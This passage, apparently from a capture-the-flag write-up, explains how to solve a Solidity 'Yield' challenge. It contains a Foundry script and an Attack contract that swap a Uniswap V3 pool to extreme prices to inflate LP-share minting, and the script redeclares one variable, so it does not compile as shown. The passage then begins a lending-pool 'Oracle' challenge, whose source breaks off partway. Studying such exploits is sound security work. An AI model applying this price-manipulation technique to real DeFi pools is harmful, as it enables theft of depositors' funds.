&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;strong&gt;Goal Understanding&lt;&#x2F;strong&gt;:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;We need to get 15e18 LP tokens&lt;&#x2F;li&gt;
&lt;li&gt;We&#x27;re given 5e18 each of token0 and token1&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;I suspected the following things in the protocol as the potential issues to exploit,&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The &lt;code&gt;rebalance()&lt;&#x2F;code&gt; function has a price movement requirement (&lt;code&gt;diff &amp;gt;= 5 * tickSpacing&lt;&#x2F;code&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;The &lt;code&gt;_calcSharesAndAmounts()&lt;&#x2F;code&gt; function has a potential rounding issue&lt;&#x2F;li&gt;
&lt;li&gt;The &lt;code&gt;deposit()&lt;&#x2F;code&gt; function&#x27;s share calculation might be manipulated&lt;&#x2F;li&gt;
&lt;li&gt;The compiler version is &lt;code&gt;solidity ^0.7.0&lt;&#x2F;code&gt;, i.e, suceptible to integer overflows&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Price Manipulation&lt;&#x2F;strong&gt;:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The Yield contract uses the pool&#x27;s price to calculate LP token shares&lt;&#x2F;li&gt;
&lt;li&gt;We can manipulate the pool&#x27;s price by performing large swaps&lt;&#x2F;li&gt;
&lt;li&gt;When we swap token0 for token1, we push the price to the minimum (MIN_SQRT_RATIO)&lt;&#x2F;li&gt;
&lt;li&gt;When we swap token1 for token0, we push the price to the maximum (MAX_SQRT_RATIO)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Share Calculation Exploit&lt;&#x2F;strong&gt;:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The &lt;code&gt;_calcSharesAndAmounts()&lt;&#x2F;code&gt; function calculates shares based on the current pool price&lt;&#x2F;li&gt;
&lt;li&gt;When the price is manipulated to extreme values, the share calculation becomes inaccurate&lt;&#x2F;li&gt;
&lt;li&gt;This allows us to get more LP tokens than we should for our deposit&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Yield.s.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: Unlicense
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.7.0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;forge-std&#x2F;Script.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;forge-std&#x2F;console.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@uniswap&#x2F;v3-core&#x2F;contracts&#x2F;interfaces&#x2F;IUniswapV3Pool.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@openzeppelin-contracts-3.4.2&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;IERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import {Yield } from &amp;quot;..&#x2F;src&#x2F;Yield.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;contract YieldSolve is Script {
&lt;&#x2F;span&gt;&lt;span&gt;    Yield public yield = Yield(0x59CD84565A441D6551ecb87F7878F4b028AD8e8B);
&lt;&#x2F;span&gt;&lt;span&gt;    IUniswapV3Pool public pool = yield.pool();
&lt;&#x2F;span&gt;&lt;span&gt;    IERC20 public token0 = IERC20(pool.token0());
&lt;&#x2F;span&gt;&lt;span&gt;    IERC20 public token1 = IERC20(pool.token1());
&lt;&#x2F;span&gt;&lt;span&gt;    address player = vm.envAddress(&amp;quot;PLAYER&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function run() external{
&lt;&#x2F;span&gt;&lt;span&gt;        vm.startBroadcast(vm.envUint(&amp;quot;PRIVATE_KEY&amp;quot;));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player : &amp;quot;, player);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance: &amp;quot;, player.balance);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Yield : &amp;quot;, address(yield));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Pool : &amp;quot;, address(pool));
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; console.log(&amp;quot;token0 : &amp;quot;, address(token0));
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; console.log(&amp;quot;token1 : &amp;quot;, address(token1));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Pool balance of token0 : &amp;quot;, token0.balanceOf(address(pool)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Pool balance of token1 : &amp;quot;, token1.balanceOf(address(pool)));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        (uint160 sqrtPriceX96,int24 tick,,,,,) = pool.slot0();
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Pool tick : &amp;quot;, tick);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Pool sqrtPriceX96 : &amp;quot;, uint256(sqrtPriceX96));
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; console.log(&amp;quot;Token0 price in terms of Token1 : &amp;quot;, 1.0001**tick);
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; console.log(&amp;quot;baseLower: &amp;quot;, yield.baseLower());
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; console.log(&amp;quot;baseUpper: &amp;quot;, yield.baseUpper());
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; console.log(&amp;quot;tickSpacing: &amp;quot;, yield.tickSpacing());
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        (uint256 total0, uint256 total1) = yield.getTotalAmounts();
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;total0: &amp;quot;, total0);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;total1: &amp;quot;, total1);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Yield balance of token0 : &amp;quot;, token0.balanceOf(address(yield)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Yield balance of token1 : &amp;quot;, token1.balanceOf(address(yield)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Yield getBalance0() : &amp;quot;, yield.getBalance0());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Yield getBalance1() : &amp;quot;, yield.getBalance1());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Initial LP tokens : &amp;quot;, yield.totalSupply());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Yield accruedProtocolFees0() : &amp;quot;, yield.accruedProtocolFees0());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Yield accruedProtocolFees1() : &amp;quot;, yield.accruedProtocolFees1());
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of token0 : &amp;quot;, token0.balanceOf(address(player)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of token1 : &amp;quot;, token1.balanceOf(address(player)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of LP tokens : &amp;quot;, yield.balanceOf(address(player)));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        token0.approve(address(yield),  14 ether);
&lt;&#x2F;span&gt;&lt;span&gt;        token1.approve(address(yield), 15 ether);
&lt;&#x2F;span&gt;&lt;span&gt;        yield.deposit( 14 ether, 15 ether, 1, 1, player);
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Repeat the following process until we got more LP tokens
&lt;&#x2F;span&gt;&lt;span&gt;        Attack attack = new Attack(address(yield), player);
&lt;&#x2F;span&gt;&lt;span&gt;        Attack attack = Attack(0xf5420a93FCa0E520E319Dc3f05625c79613be6b0);
&lt;&#x2F;span&gt;&lt;span&gt;        token0.transfer(address(attack), 2 ether);
&lt;&#x2F;span&gt;&lt;span&gt;        token1.transfer(address(attack), 2 ether);
&lt;&#x2F;span&gt;&lt;span&gt;        attack.exploit(true); 
&lt;&#x2F;span&gt;&lt;span&gt;        yield.withdraw(yield.balanceOf(player), 0, 0, player);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        (sqrtPriceX96,tick,,,,,) = pool.slot0();
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Pool tick : &amp;quot;, tick);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Pool sqrtPriceX96 : &amp;quot;, uint256(sqrtPriceX96));
&lt;&#x2F;span&gt;&lt;span&gt;        (total0, total1) = yield.getTotalAmounts();
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;total0: &amp;quot;, total0);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;total1: &amp;quot;, total1);
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Yield getBalance0() : &amp;quot;, yield.getBalance0());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Yield getBalance1() : &amp;quot;, yield.getBalance1());
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Initial LP tokens : &amp;quot;, yield.totalSupply());
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of token0 : &amp;quot;, token0.balanceOf(address(player)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of token1 : &amp;quot;, token1.balanceOf(address(player)));
&lt;&#x2F;span&gt;&lt;span&gt;        console.log(&amp;quot;Player balance of LP tokens : &amp;quot;, yield.balanceOf(address(player)));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; console.log(&amp;quot;isSolved() : &amp;quot;, yield.isSolved());
&lt;&#x2F;span&gt;&lt;span&gt;        vm.stopBroadcast();
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack {
&lt;&#x2F;span&gt;&lt;span&gt;    Yield public yield;
&lt;&#x2F;span&gt;&lt;span&gt;    IUniswapV3Pool public pool;
&lt;&#x2F;span&gt;&lt;span&gt;    IERC20 public token0;
&lt;&#x2F;span&gt;&lt;span&gt;    IERC20 public token1;
&lt;&#x2F;span&gt;&lt;span&gt;    address public player;
&lt;&#x2F;span&gt;&lt;span&gt;    uint160 internal constant MIN_SQRT_RATIO = 4295128739;
&lt;&#x2F;span&gt;&lt;span&gt;    uint160 internal constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _yeild, address _player){
&lt;&#x2F;span&gt;&lt;span&gt;        yield = Yield(_yeild);
&lt;&#x2F;span&gt;&lt;span&gt;        pool = yield.pool();
&lt;&#x2F;span&gt;&lt;span&gt;        token0 = IERC20(pool.token0());
&lt;&#x2F;span&gt;&lt;span&gt;        token1 = IERC20(pool.token1());
&lt;&#x2F;span&gt;&lt;span&gt;        player = _player;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function exploit(bool zeroForOne) public {
&lt;&#x2F;span&gt;&lt;span&gt;        (uint160 sqrtPriceX96,,,,,,) = pool.slot0();
&lt;&#x2F;span&gt;&lt;span&gt;        if (zeroForOne){
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 token0bal =  token0.balanceOf(address(this));
&lt;&#x2F;span&gt;&lt;span&gt;            token0.approve(address(pool), token0bal);
&lt;&#x2F;span&gt;&lt;span&gt;            pool.swap(player, true, int256(token0bal), MIN_SQRT_RATIO+1, &amp;quot;&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        else {
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 token1bal =  token1.balanceOf(address(this));
&lt;&#x2F;span&gt;&lt;span&gt;            token1.approve(address(pool), token1bal);
&lt;&#x2F;span&gt;&lt;span&gt;            pool.swap(player, false, int256(token1bal), MAX_SQRT_RATIO-1, &amp;quot;&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        token0.transfer(player, token0.balanceOf(address(this)));
&lt;&#x2F;span&gt;&lt;span&gt;        token1.transfer(player, token1.balanceOf(address(this)));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;    function uniswapV3SwapCallback(
&lt;&#x2F;span&gt;&lt;span&gt;        int256 amount0Delta,
&lt;&#x2F;span&gt;&lt;span&gt;        int256 amount1Delta,
&lt;&#x2F;span&gt;&lt;span&gt;        bytes calldata data
&lt;&#x2F;span&gt;&lt;span&gt;    ) external  {
&lt;&#x2F;span&gt;&lt;span&gt;        require(msg.sender == address(pool));
&lt;&#x2F;span&gt;&lt;span&gt;        if (amount0Delta &amp;gt; 0) token0.transfer(msg.sender, uint256(amount0Delta));
&lt;&#x2F;span&gt;&lt;span&gt;        if (amount1Delta &amp;gt; 0) token1.transfer(msg.sender, uint256(amount1Delta));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;p&gt;The exploit takes advantage of the fact that the Yield contract doesn&#x27;t properly handle extreme price movements in the underlying Uniswap V3 pool, allowing us to manipulate the LP token calculations to our advantage.&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;oracle&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#oracle&quot; aria-label=&quot;Anchor link for: oracle&quot;&gt;Oracle&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;P: &quot;Michael wrote a Dex pool for USDe and USDC tokens along with their respective oracles. Then he borrowed a large position from his own pool trusting his own code. The pool is deployed with the same code and params as the actual pool at https:&#x2F;&#x2F;etherscan.io&#x2F;tx&#x2F;0x6f4438aa1785589e2170599053a0cdc740d8987746a4b5ad9614b6ab7bb4e550. You are given 10000 tokens of USDe and USDC. Your goal is to get 20000 of USDe.&lt;&#x2F;p&gt;
&lt;p&gt;Might help you: check the differences betweeen the current implementation and the implementation deployed at the pool creation time on mainnet&quot;&lt;&#x2F;p&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Oracle.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
    &lt;&#x2F;button&gt;

    
    &lt;div class=&quot;note-content&quot; style=&quot;display: block;&quot;&gt;
    
    &lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@openzeppelin-contracts-4.8.0&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;IERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@openzeppelin-contracts-4.8.0&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@openzeppelin-contracts-4.8.0&#x2F;contracts&#x2F;security&#x2F;ReentrancyGuard.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@openzeppelin-contracts-4.8.0&#x2F;contracts&#x2F;access&#x2F;Ownable.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;@openzeppelin-contracts-4.8.0&#x2F;contracts&#x2F;utils&#x2F;math&#x2F;Math.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;interface ICurve {
&lt;&#x2F;span&gt;&lt;span&gt;    function add_liquidity(
&lt;&#x2F;span&gt;&lt;span&gt;        uint256[] calldata amounts,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 min_mint_amount
&lt;&#x2F;span&gt;&lt;span&gt;    ) external returns (uint256);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function remove_liquidity_imbalance(
&lt;&#x2F;span&gt;&lt;span&gt;        uint256[] calldata amounts,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 max_burn_amount
&lt;&#x2F;span&gt;&lt;span&gt;    ) external returns (uint256);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function price_oracle(uint256 idx) external view returns (uint256);
&lt;&#x2F;span&gt;&lt;span&gt;    function last_price(uint256 idx) external view returns (uint256);
&lt;&#x2F;span&gt;&lt;span&gt;    function coins(uint256 idx) external view returns (address);
&lt;&#x2F;span&gt;&lt;span&gt;    function balanceOf(address owner) external view returns (uint256);
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; function lp_token() external view returns (address);
&lt;&#x2F;span&gt;&lt;span&gt;    function approve(address spender, uint256 amount) external returns (bool);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function exchange(
&lt;&#x2F;span&gt;&lt;span&gt;        int128 i,
&lt;&#x2F;span&gt;&lt;span&gt;        int128 j,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 dx,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 min_dy
&lt;&#x2F;span&gt;&lt;span&gt;    ) external returns (uint256);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;interface IPriceOracle {
&lt;&#x2F;span&gt;&lt;span&gt;    function getAssetPrice(uint256 _assetId) external view returns (uint256);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract SimplePriceOracle is IPriceOracle, Ownable {
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public price;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(uint256 _price) Ownable() {
&lt;&#x2F;span&gt;&lt;span&gt;        price = _price;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function setPrice(uint256 _price) external onlyOwner {
&lt;&#x2F;span&gt;&lt;span&gt;        price = _price;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getAssetPrice(uint256 _assetId) external view returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        return price;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract CurvePriceOracle is IPriceOracle {
&lt;&#x2F;span&gt;&lt;span&gt;    address public curvePool;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public idx;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _curvePool, uint256 _idx, uint256 anchor) {
&lt;&#x2F;span&gt;&lt;span&gt;        curvePool = _curvePool;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 absDiff = 0;
&lt;&#x2F;span&gt;&lt;span&gt;        if (ICurve(curvePool).price_oracle(_idx) &amp;gt; anchor) {
&lt;&#x2F;span&gt;&lt;span&gt;            absDiff = ICurve(curvePool).price_oracle(_idx) - anchor;
&lt;&#x2F;span&gt;&lt;span&gt;        } else {
&lt;&#x2F;span&gt;&lt;span&gt;            absDiff = anchor - ICurve(curvePool).price_oracle(_idx);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        require(absDiff &amp;lt;= 1e8, &amp;quot;Price oracle has been manipulated :(&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getAssetPrice(uint256 _assetId) external view returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        return ICurve(curvePool).price_oracle(idx);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getSpotPrice() external view returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        return ICurve(curvePool).last_price(idx);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Oracle is ReentrancyGuard, Ownable {
&lt;&#x2F;span&gt;&lt;span&gt;    struct Asset {
&lt;&#x2F;span&gt;&lt;span&gt;        IERC20 token;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 totalDeposited;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 totalBorrowed;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 baseRate;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    struct UserAccount {
&lt;&#x2F;span&gt;&lt;span&gt;        mapping(uint256 =&amp;gt; uint256) deposited;
&lt;&#x2F;span&gt;&lt;span&gt;        mapping(uint256 =&amp;gt; uint256) borrowed;
&lt;&#x2F;span&gt;&lt;span&gt;        mapping(uint256 =&amp;gt; uint256) lastInterestBlock;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(address =&amp;gt; UserAccount) userAccounts;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(uint256 =&amp;gt; Asset) public assets;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public assetCount;
&lt;&#x2F;span&gt;&lt;span&gt;    address public player;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public constant LIQUIDATION_CLOSE_FACTOR = 100; &#x2F;&#x2F; 100% of the borrow can be liquidated
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public constant PRECISION = 1e18;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public constant MAX_LOOPS = 10;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public constant BAD_DEBT_RATIO = 110;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public constant MIN_HEALTH_FACTOR = 1.05e18;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(uint256 =&amp;gt; address) public priceOracles;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    event AssetAdded(uint256 indexed assetId, address indexed token);
&lt;&#x2F;span&gt;&lt;span&gt;    event Deposit(address indexed user, uint256 indexed assetId, uint256 amount);
&lt;&#x2F;span&gt;&lt;span&gt;    event Withdraw(address indexed user, uint256 indexed assetId, uint256 amount);
&lt;&#x2F;span&gt;&lt;span&gt;    event Borrow(address indexed user, uint256 indexed assetId, uint256 amount);
&lt;&#x2F;span&gt;&lt;span&gt;    event Repay(address indexed user, uint256 indexed assetId, uint256 amount);
&lt;&#x2F;span&gt;&lt;span&gt;    event Liquidate(
&lt;&#x2F;span&gt;&lt;span&gt;        address indexed liquidator,
&lt;&#x2F;span&gt;&lt;span&gt;        address indexed borrower,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 indexed assetId,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 collateralAssetId,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 collateralAmount
&lt;&#x2F;span&gt;&lt;span&gt;    );
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(address _player) Ownable() {
&lt;&#x2F;span&gt;&lt;span&gt;        player = _player;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function isSolved() external view returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        return assets[0].token.balanceOf(address(player)) &amp;gt;= 20000 ether;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getUserAccount(address user, uint256 depositAssetId, uint256 borrowAssetId, uint256 interestAssetId) external view returns (uint256, uint256, uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        UserAccount storage account = userAccounts[user];
&lt;&#x2F;span&gt;&lt;span&gt;        return (account.deposited[depositAssetId], account.borrowed[borrowAssetId], account.lastInterestBlock[interestAssetId]);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function addAsset(
&lt;&#x2F;span&gt;&lt;span&gt;        address _token,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 _baseRate
&lt;&#x2F;span&gt;&lt;span&gt;    ) external onlyOwner {
&lt;&#x2F;span&gt;&lt;span&gt;        assets[assetCount] = Asset({
&lt;&#x2F;span&gt;&lt;span&gt;            token: IERC20(_token),
&lt;&#x2F;span&gt;&lt;span&gt;            totalDeposited: 0,
&lt;&#x2F;span&gt;&lt;span&gt;            totalBorrowed: 0,
&lt;&#x2F;span&gt;&lt;span&gt;            baseRate: _baseRate
&lt;&#x2F;span&gt;&lt;span&gt;        });
&lt;&#x2F;span&gt;&lt;span&gt;        emit AssetAdded(assetCount, _token);
&lt;&#x2F;span&gt;&lt;span&gt;        assetCount++;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function setPriceOracle(uint256 _assetId, address _priceOracle) external onlyOwner {
&lt;&#x2F;span&gt;&lt;span&gt;        priceOracles[_assetId] = _priceOracle;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function deposit(uint256 _assetId, uint256 _amount) external nonReentrant {
&lt;&#x2F;span&gt;&lt;span&gt;        require(_assetId &amp;lt; assetCount, &amp;quot;Invalid asset&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(_amount &amp;gt; 0, &amp;quot;Amount must be greater than 0&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Asset storage asset = assets[_assetId];
&lt;&#x2F;span&gt;&lt;span&gt;        require(asset.token.transferFrom(msg.sender, address(this), _amount), &amp;quot;Transfer failed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        updateInterest(msg.sender, _assetId);
&lt;&#x2F;span&gt;&lt;span&gt;        userAccounts[msg.sender].deposited[_assetId] += _amount;
&lt;&#x2F;span&gt;&lt;span&gt;        asset.totalDeposited += _amount;
&lt;&#x2F;span&gt;&lt;span&gt;
